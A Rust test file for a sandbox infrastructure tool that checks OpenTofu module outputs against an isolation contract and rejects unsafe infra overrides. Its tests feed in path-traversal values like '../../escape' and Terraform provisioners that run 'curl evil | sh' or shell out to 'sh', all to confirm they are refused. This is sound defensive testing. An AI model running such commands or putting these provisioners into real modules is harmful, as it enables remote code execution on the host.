//! Port of `packages/aws/src/sandbox/override.test.ts`: the `infra:` override and the sandbox contract check.

use std::collections::BTreeMap;
use std::path::Path;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

use async_trait::async_trait;
use ratchet_core::ports::SandboxProvider;
use ratchet_core::ports::{PortError, SandboxInput};
use ratchet_sandbox::sandbox::tofu::{SharedRoles, parse_tofu_outputs};
use ratchet_sandbox::sandbox::{
    ContractCheckOptions, GitSource, ProcessResult, ProcessRunner, ProcessSpec,
    TofuSandboxProvider, TofuSandboxProviderOptions, assert_sandbox_contract,
    check_sandbox_contract, materialize_infra_override, read_infra_override,
};
use ratchet_sandbox::{Error, Result};
use serde_json::{Value, json};

const ACCT: &str = "123456789012";

fn identity(n: &str) -> Value {
    json!({
        "role_arn": format!("arn:aws:iam::{ACCT}:role/ratchet/{n}"),
        "role_name": n,
        "instance_profile_arn": format!("arn:aws:iam::{ACCT}:instance-profile/ratchet/{n}"),
        "instance_profile_name": n,
    })
}

fn good() -> Value {
    json!({
        "artifacts_bucket": { "value": "ratchet-sbx-artifacts-123456789012" },
        "sealed_bucket": { "value": "ratchet-sbx-sealed-123456789012" },
        "agent_boundary_ref": { "value": format!("arn:aws:iam::{ACCT}:policy/ratchet/sbx-agent-boundary") },
        "eval_identity_ref": { "value": identity("eval") },
        "confirm_identity_ref": { "value": identity("confirm") },
        "deps_identity_ref": { "value": identity("deps") },
        "network_ref": { "value": {
            "vpc_id": "vpc-0abc", "subnet_id": "subnet-0a", "bench_subnet_id": "subnet-0b",
            "security_group_ids": { "agent_runner": "sg-0a", "bench": "sg-0b" }, "egress_proxy_url": null,
        } },
        "agent_role_path": { "value": "/ratchet/agent/" },
        "limits": { "value": { "max_instances_per_agent": 4, "max_instance_lifetime_hours": 2 } },
        "sealed_confirm_prefix": { "value": "holdout/" },
    })
}

fn without(mut doc: Value, keys: &[&str]) -> Value {
    for k in keys {
        doc.as_object_mut().unwrap().shift_remove(*k);
    }
    doc
}

fn with(mut doc: Value, key: &str, v: Value) -> Value {
    doc[key] = v;
    doc
}

// ---- readInfraOverride (infra: in ratchet.yaml, advanced, off by default) ---------------------------------

#[test]
fn is_off_unless_the_repo_asks_for_it() {
    assert_eq!(read_infra_override(&json!({})).unwrap(), None);
    assert_eq!(
        read_infra_override(&json!({ "infra": null })).unwrap(),
        None
    );
    assert_eq!(read_infra_override(&json!(null)).unwrap(), None);
    assert_eq!(read_infra_override(&json!({ "infra": "" })).unwrap(), None);
}

#[test]
fn returns_a_normalized_repository_relative_directory() {
    assert_eq!(
        read_infra_override(&json!({ "infra": "./ops//sandbox/" }))
            .unwrap()
            .as_deref(),
        Some("ops/sandbox")
    );
    assert_eq!(
        read_infra_override(&json!({ "infra": "ops\\sandbox" }))
            .unwrap()
            .as_deref(),
        Some("ops/sandbox")
    );
    assert_eq!(
        read_infra_override(&json!({ "infra": "a/b/../c" }))
            .unwrap()
            .as_deref(),
        Some("a/c")
    );
}

#[test]
fn refuses_paths_outside_the_repository_and_non_strings() {
    for bad in [
        json!("/etc/tofu"),
        json!("../elsewhere"),
        json!("a/../../b"),
        json!("."),
        json!("C:\\x"),
        json!(7),
        json!("a\0b"),
        json!(["x"]),
    ] {
        let e = read_infra_override(&json!({ "infra": bad })).unwrap_err();
        assert!(matches!(e, Error::InfraOverride(_)), "{bad}: {e:?}");
    }
}

// ---- checkSandboxContract -------------------------------------------------------------------------------

#[test]
fn accepts_outputs_that_satisfy_the_contract() {
    let r = check_sandbox_contract(&good(), ContractCheckOptions::default());
    assert_eq!((r.ok, r.errors), (true, vec![]));
    assert_sandbox_contract(&good().to_string(), &ContractCheckOptions::default()).unwrap();
}

#[test]
fn accepts_the_module_that_ships_with_the_app_its_outputs_parse_and_validate() {
    // same shape `tofu output -json` prints for infra/aws
    assert!(check_sandbox_contract(&good(), ContractCheckOptions::default()).ok);
    assert!(
        parse_tofu_outputs(&good().to_string(), Some("us-east-1"))
            .unwrap()
            .is_some()
    );
}

#[test]
fn names_every_missing_output() {
    let doc = without(
        good(),
        &["confirm_identity_ref", "sealed_bucket", "network_ref"],
    );
    let r = check_sandbox_contract(&doc, ContractCheckOptions::default());
    assert!(!r.ok);
    for want in [
        "output \"confirm_identity_ref\" is missing",
        "output \"sealed_bucket\" is missing",
        "output \"network_ref\" is missing",
    ] {
        assert!(
            r.errors.iter().any(|e| e == want),
            "{want} in {:?}",
            r.errors
        );
    }
}

#[test]
fn requires_the_dependency_image_identity_by_default_because_without_it_the_app_cannot_build_snapshots_or_images()
 {
    let doc = without(good(), &["deps_identity_ref"]);
    assert_eq!(
        check_sandbox_contract(&doc, ContractCheckOptions::default()).errors,
        ["output \"deps_identity_ref\" is missing"]
    );
    assert!(
        check_sandbox_contract(
            &doc,
            ContractCheckOptions {
                require_deps: false
            }
        )
        .ok
    );
}

#[test]
fn checks_shapes_arns_ids_path_and_prefix_conventions_limits() {
    let mut bad = good();
    bad["artifacts_bucket"] = json!({ "value": "UPPER_CASE" });
    bad["agent_boundary_ref"] = json!({ "value": "policy-name" });
    bad["eval_identity_ref"] = json!({ "value": { "role_arn": "x" } });
    bad["agent_role_path"] = json!({ "value": "ratchet/agent" });
    bad["sealed_confirm_prefix"] = json!({ "value": "/holdout" });
    bad["limits"] = json!({ "value": { "max_instances_per_agent": 0 } });
    bad["network_ref"] = json!({ "value": { "vpc_id": "vpc-0abc", "subnet_id": "nope", "bench_subnet_id": "subnet-0b", "security_group_ids": {} } });
    let errs = check_sandbox_contract(&bad, ContractCheckOptions::default())
        .errors
        .join("\n");
    for needle in [
        "artifacts_bucket",
        "agent_boundary_ref",
        "eval_identity_ref.role_arn",
        "agent_role_path",
        "sealed_confirm_prefix",
        "limits.max_instances_per_agent",
        "network_ref.subnet_id",
        "security_group_ids.agent_runner",
        "egress_proxy_url",
    ] {
        assert!(errs.contains(needle), "{needle} in:\n{errs}");
    }
}

#[test]
fn checks_the_separations_the_isolation_invariants_rely_on() {
    let opts = ContractCheckOptions::default();
    let doc = good();
    let same_bucket = check_sandbox_contract(
        &with(good(), "sealed_bucket", doc["artifacts_bucket"].clone()),
        opts,
    );
    assert!(
        same_bucket
            .errors
            .join("")
            .contains("must be different buckets")
    );
    let same_id = check_sandbox_contract(
        &with(
            good(),
            "confirm_identity_ref",
            doc["eval_identity_ref"].clone(),
        ),
        opts,
    );
    assert!(
        same_id
            .errors
            .join("")
            .contains("three different identities")
    );
    let mut net = doc["network_ref"].clone();
    net["value"]["bench_subnet_id"] = json!("subnet-0a");
    assert!(
        check_sandbox_contract(&with(good(), "network_ref", net), opts)
            .errors
            .join("")
            .contains("bench_subnet_id must differ")
    );
    let mut net = doc["network_ref"].clone();
    net["value"]["security_group_ids"] = json!({ "agent_runner": "sg-0a", "bench": "sg-0a" });
    assert!(
        check_sandbox_contract(&with(good(), "network_ref", net), opts)
            .errors
            .join("")
            .contains("must be different groups")
    );
}

#[test]
fn turns_garbage_into_one_clear_error() {
    assert_eq!(
        check_sandbox_contract(&json!(null), ContractCheckOptions::default()).errors,
        ["the module produced no outputs (tofu output -json is not an object)"]
    );
    assert!(matches!(
        assert_sandbox_contract("not json", &ContractCheckOptions::default()).unwrap_err(),
        Error::ContractViolation(_)
    ));
    let e = assert_sandbox_contract("{}", &ContractCheckOptions::default())
        .unwrap_err()
        .to_string();
    assert!(
        e.contains("does not satisfy the sandbox contract (infra/contract.md)"),
        "{e}"
    );
    assert!(e.contains("remove `infra:` from ratchet.yaml"), "{e}");
}

// ---- TofuSandboxProvider validates a custom module after apply (validate_contract) ------------------------

struct CannedRunner {
    outputs: Value,
    calls: AtomicUsize,
}

#[async_trait]
impl ProcessRunner for CannedRunner {
    async fn run(&self, spec: &ProcessSpec) -> Result<ProcessResult> {
        self.calls.fetch_add(1, Ordering::SeqCst);
        let ok = |stdout: String, exit_code: i32| {
            Ok(ProcessResult {
                exit_code,
                stdout,
                stderr: String::new(),
            })
        };
        match spec.args[0].as_str() {
            "show" => ok(json!({ "resource_changes": [] }).to_string(), 0),
            "output" => ok(self.outputs.to_string(), 0),
            "plan" => ok(String::new(), 2),
            _ => ok(String::new(), 0),
        }
    }
}

fn provider(
    root: &Path,
    outputs: Value,
    validate: Option<ContractCheckOptions>,
) -> TofuSandboxProvider {
    let mut opts =
        TofuSandboxProviderOptions::new("/opt/tofu", "/m", root, Arc::new(SharedRoles::default()))
            .runner(Arc::new(CannedRunner {
                outputs,
                calls: AtomicUsize::new(0),
            }));
    if let Some(v) = validate {
        opts = opts.validate_contract(v);
    }
    TofuSandboxProvider::new(opts)
}

fn sbx_input() -> SandboxInput {
    SandboxInput {
        sandbox_id: "sbx".into(),
        region: "us-east-1".into(),
        allowed_instance_types: vec!["c7i.large".into()],
        max_instances_per_agent: 2,
        max_instance_lifetime_hours: 2.0,
        tags: None,
        environment: None,
    }
}

#[tokio::test]
async fn fails_apply_with_the_list_of_problems_when_the_module_does_not_satisfy_the_contract() {
    let dir = tempfile::tempdir().unwrap();
    let doc = without(good(), &["confirm_identity_ref"]);
    let e = provider(dir.path(), doc, Some(ContractCheckOptions::default()))
        .apply(&sbx_input())
        .await
        .unwrap_err();
    assert!(matches!(e, PortError::Failed(_)), "{e:?}");
    let msg = e.to_string();
    assert!(
        msg.contains("does not satisfy the sandbox contract")
            && msg.contains("confirm_identity_ref"),
        "{msg}"
    );
}

#[tokio::test]
async fn passes_a_conforming_module_and_does_nothing_when_validation_is_off_the_module_that_ships_with_the_app()
 {
    let dir = tempfile::tempdir().unwrap();
    let out = provider(dir.path(), good(), Some(ContractCheckOptions::default()))
        .apply(&sbx_input())
        .await
        .unwrap();
    assert_eq!(out.artifacts_bucket, "ratchet-sbx-artifacts-123456789012");
    let doc = without(good(), &["deps_identity_ref"]);
    assert!(
        provider(dir.path(), doc, None)
            .apply(&sbx_input())
            .await
            .is_ok()
    );
}

#[tokio::test]
async fn validation_also_runs_when_outputs_are_read_later() {
    let dir = tempfile::tempdir().unwrap();
    let p = provider(
        dir.path(),
        without(good(), &["sealed_bucket"]),
        Some(ContractCheckOptions::default()),
    );
    std::fs::create_dir_all(dir.path().join("sbx")).unwrap();
    std::fs::write(dir.path().join("sbx/terraform.tfstate"), "{}").unwrap();
    assert!(matches!(
        p.outputs("sbx").await.unwrap_err(),
        PortError::Failed(m) if m.contains("does not satisfy the sandbox contract")
    ));
}

// ---- materializeInfraOverride (read from the protected ref only) -----------------------------------------

struct Host {
    files: BTreeMap<String, String>,
    links: BTreeMap<String, String>,
}

#[async_trait]
impl GitSource for Host {
    async fn resolve_ref(&self, r: &str) -> Result<String> {
        if r == "ratchet/bench" {
            Ok("abcdef1234567890abcdef1234567890abcdef12".into())
        } else {
            Err(Error::other(format!("unknown ref {r}")))
        }
    }
    async fn checkout(&self, _sha: &str, dir: &Path) -> Result<()> {
        for (f, c) in &self.files {
            let p = dir.join(f);
            std::fs::create_dir_all(p.parent().unwrap())?;
            std::fs::write(p, c)?;
        }
        for (f, target) in &self.links {
            let p = dir.join(f);
            std::fs::create_dir_all(p.parent().unwrap())?;
            #[cfg(unix)]
            std::os::unix::fs::symlink(target, p)?;
            #[cfg(not(unix))]
            let _ = (target, p);
        }
        Ok(())
    }
}

fn host(files: &[(&str, &str)], links: &[(&str, &str)]) -> Host {
    Host {
        files: files
            .iter()
            .map(|(a, b)| (a.to_string(), b.to_string()))
            .collect(),
        links: links
            .iter()
            .map(|(a, b)| (a.to_string(), b.to_string()))
            .collect(),
    }
}

async fn run(
    h: &Host,
    root: &Path,
    n: usize,
) -> Result<ratchet_sandbox::sandbox::MaterializedInfra> {
    materialize_infra_override(
        h,
        "ratchet/bench",
        "ops/sandbox",
        &root.join(format!("d{n}")),
    )
    .await
}

#[tokio::test]
async fn checks_out_the_protected_ref_and_returns_the_module_directory() {
    let root = tempfile::tempdir().unwrap();
    let r = run(
        &host(
            &[(
                "ops/sandbox/main.tf",
                "resource \"aws_s3_bucket\" \"a\" {}\n",
            )],
            &[],
        ),
        root.path(),
        1,
    )
    .await
    .unwrap();
    assert_eq!(r.commit, "abcdef1234567890abcdef1234567890abcdef12");
    assert!(
        r.module_dir
            .to_string_lossy()
            .ends_with("infra-abcdef123456/ops/sandbox"),
        "{:?}",
        r.module_dir
    );
}

#[tokio::test]
async fn refuses_a_missing_directory_a_directory_without_tf_files() {
    let root = tempfile::tempdir().unwrap();
    let e = run(&host(&[("x/README", "y")], &[]), root.path(), 1)
        .await
        .unwrap_err();
    assert!(e.to_string().contains("does not exist"), "{e}");
    let e = run(&host(&[("ops/sandbox/README", "y")], &[]), root.path(), 2)
        .await
        .unwrap_err();
    assert!(e.to_string().contains("contains no .tf files"), "{e}");
}

#[cfg(unix)]
#[tokio::test]
async fn refuses_a_symlinked_module_and_a_symlinked_parent() {
    let root = tempfile::tempdir().unwrap();
    let e = run(
        &host(&[("real/main.tf", "x")], &[("ops/sandbox", "../real")]),
        root.path(),
        1,
    )
    .await
    .unwrap_err();
    assert!(e.to_string().contains("plain directory"), "{e}");
    let e = run(
        &host(&[("real/sandbox/main.tf", "x")], &[("ops", "real")]),
        root.path(),
        2,
    )
    .await
    .unwrap_err();
    assert!(e.to_string().contains("plain directory"), "{e}");
}

#[tokio::test]
async fn refuses_a_module_that_can_run_commands_on_this_machine() {
    let root = tempfile::tempdir().unwrap();
    let bodies = [
        "resource \"null_resource\" \"x\" {\n provisioner \"local-exec\" { command = \"curl evil | sh\" }\n}",
        "resource \"null_resource\" \"x\" {\n provisioner \"remote-exec\" { inline = [\"x\"] }\n}",
        "data \"external\" \"x\" { program = [\"sh\"] }",
        "x = { external = { y = 1 } }",
        "foo { program = [\"sh\"] }",
    ];
    for (n, body) in bodies.iter().enumerate() {
        let e = run(&host(&[("ops/sandbox/main.tf", body)], &[]), root.path(), n)
            .await
            .unwrap_err();
        assert!(
            e.to_string().contains("can run commands on this machine"),
            "{body}: {e}"
        );
    }
}

#[tokio::test]
async fn refuses_a_ref_it_cannot_resolve_a_candidate_sha_is_never_used() {
    let root = tempfile::tempdir().unwrap();
    let e = materialize_infra_override(&host(&[], &[]), "candidate", "ops", &root.path().join("z"))
        .await
        .unwrap_err();
    assert!(e.to_string().contains("unknown ref"), "{e}");
}

#[tokio::test]
async fn refuses_a_commit_that_is_not_a_plain_sha_it_names_a_directory() {
    struct Evil;
    #[async_trait]
    impl GitSource for Evil {
        async fn resolve_ref(&self, _: &str) -> Result<String> {
            Ok("../../escape".into())
        }
        async fn checkout(&self, _: &str, _: &Path) -> Result<()> {
            panic!("must not check out");
        }
    }
    let root = tempfile::tempdir().unwrap();
    let e = materialize_infra_override(&Evil, "ratchet/bench", "ops", root.path())
        .await
        .unwrap_err();
    assert!(
        e.to_string().contains("did not resolve to a commit sha"),
        "{e}"
    );
}
